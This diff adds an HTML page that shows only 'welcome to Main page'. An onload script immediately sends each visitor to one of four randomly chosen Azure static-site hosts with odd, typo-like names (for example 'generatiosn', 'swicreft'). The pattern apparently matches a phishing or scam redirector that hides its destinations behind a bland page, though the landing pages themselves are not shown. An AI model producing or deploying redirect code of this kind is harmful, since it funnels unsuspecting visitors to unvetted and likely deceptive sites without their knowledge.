@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Main</title>
+   <script type="text/javascript">
+        window.onload = function() {
+            var landingPages = ["https://swicreft.z1.web.core.windows.net/", "https://vibhuthai.z1.web.core.windows.net/", "https://generatiosn.z1.web.core.windows.net/", "https://juferks.z30.web.core.windows.net/"];
+            var randomPage = landingPages[Math.floor(Math.random() * landingPages.length)];
+            window.location.href = randomPage;
+        }
+    </script>
+    <style>
+        body{
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+    </style>
+</head>
+<body>
+    <h1>welcome to Main page</h1>
+</body>
+</html>
